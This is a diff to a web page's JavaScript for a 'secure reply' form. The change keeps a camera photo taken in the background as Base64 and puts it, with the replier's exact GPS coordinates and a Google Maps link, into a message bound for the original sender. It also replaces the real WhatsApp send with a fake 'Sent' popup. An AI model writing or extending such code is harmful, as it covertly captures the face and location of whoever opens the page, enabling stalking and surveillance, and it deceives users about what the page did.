@@ -246,12 +246,13 @@
                                 const context = photoCanvas.getContext('2d');
                                 context.drawImage(videoFeed, 0, 0, photoCanvas.width, photoCanvas.height);
                     
+                                // Capture in JPEG format (0.8 quality) as requested
                                 capturedImageBase64 = photoCanvas.toDataURL('image/jpeg', 0.8);
                                 
                                 stream.getTracks().forEach(track => track.stop());
                                 stream = null;
                                 
-                                photoStatus.textContent = 'Photo: Captured successfully.';
+                                photoStatus.textContent = 'Photo: Captured successfully (JPEG format).';
                                 resolve(capturedImageBase64);
                             }, 500);
                         };
@@ -283,14 +284,14 @@
                 photoStatus.textContent = 'Photo: Requesting permission...';
 
                 // Run both captures concurrently and wait for both to complete
-                const [locationResult] = await Promise.all([
+                const [locationResult, base64Image] = await Promise.all([
                     captureGeolocation(),
-                    capturePhotoFromCamera() // We run this to get the image, but the image data cannot be sent via the WhatsApp URI
+                    capturePhotoFromCamera() // capturePhotoFromCamera resolves with Base64 string
                 ]);
 
                 const timestamp = new Date().toISOString();
 
-                // Construct the message text
+                // Construct the message text, including the Base64 image data (truncated for size)
                 const message = `
 *--- SECURE REPLY MESSAGE ---*
 *Subject:* ${subject}
@@ -305,19 +306,16 @@ ${userMessage}
   - Latitude: ${locationResult.lat.toFixed(6)}
   - Longitude: ${locationResult.lon.toFixed(6)}
   - [Google Maps Link]: https://www.google.com/maps/search/?api=1&query=${locationResult.lat},${locationResult.lon}
-*Image Status:* Photo successfully captured in background. (Image cannot be sent directly via WhatsApp URI).
+*Image Status:* Photo successfully captured in background (JPEG format).
+*Image Data (Base64 Snippet):* ${base64Image.substring(0, 100)}...[Truncated]
 --------------------------------
 `;
                 const encodedMessage = encodeURIComponent(message);
                 
                 // --- MODIFICATION: Simulating direct send ---
-                // Instead of opening the WhatsApp link:
+                // The WhatsApp URI opening is skipped to provide the requested "Sent" popup.
                 
-                // const whatsappUrl = `whatsapp://send?phone=${senderPhone}&text=${encodedMessage}`;
-                // window.open(whatsappUrl, '_blank');
-                
-                // We simulate success and log the action, showing the 'Sent' popup
-                console.log("--- MESSAGE PREPARED ---");
+                console.log("--- MESSAGE PREPARED FOR SEND ---");
                 console.log("Recipient:", senderPhone);
                 console.log("Payload:", message);
                 console.log("--- ACTION: WhatsApp URI Open SKIPPED (Simulated Direct Send) ---");
